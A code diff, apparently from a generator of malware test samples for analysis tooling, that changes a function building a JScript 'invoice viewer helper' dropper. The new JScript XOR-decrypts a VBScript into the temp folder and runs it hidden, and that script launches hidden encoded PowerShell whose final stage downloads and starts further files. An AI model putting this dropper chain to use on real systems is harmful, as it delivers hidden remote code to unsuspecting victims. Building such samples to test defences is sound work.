@@ -1081,13 +1081,15 @@ def xor_stager_ps1() -> bytes:
 
 
 def chain_dropper_js() -> bytes:
-    """JScript whose XOR-decrypted payload is ``powershell -enc <stager>``; the
-    stager XOR-decrypts and inflates the final stage. Exercises the whole chain
-    JS sandbox -> PowerShell -enc -> XOR -> Deflate -> final command."""
+    """Three-language chain, each stage a nested child of the previous one:
+    JScript XOR-decrypts a VBScript and drops it (FileSystemObject) -> the
+    VBScript runs ``powershell -enc <stager>`` -> the stager XOR-decrypts and
+    inflates the final stage (download stage4.ps1 + start inv_viewer.exe)."""
     import base64
 
     enc = base64.b64encode(_xor_deflate_stager(_CHAIN_FINAL).encode("utf-16-le")).decode()
-    payload = f"powershell -nop -w hidden -enc {enc}"
+    payload = ('Dim sh\r\nSet sh = CreateObject("WScript.Shell")\r\n'
+               f'sh.Run "powershell -nop -w hidden -enc {enc}", 0, False\r\n')
     key = "Fact2024"
     arr = ",".join(str(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))
     js = f"""// invoice viewer helper
@@ -1098,7 +1100,10 @@ function dec(a, key) {{
   for (var i = 0; i < a.length; i++) {{ o += String.fromCharCode(a[i] ^ key.charCodeAt(i % key.length)); }}
   return o;
 }}
-new ActiveXObject("WScript.Shell").Run(dec(data, k), 0, false);
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var p = fso.GetSpecialFolder(2) + "\\\\inv_sync.vbs";
+fso.CreateTextFile(p, true).Write(dec(data, k));
+new ActiveXObject("WScript.Shell").Run("wscript.exe //B " + p, 0, false);
 """
     return js.encode("utf-8")
 
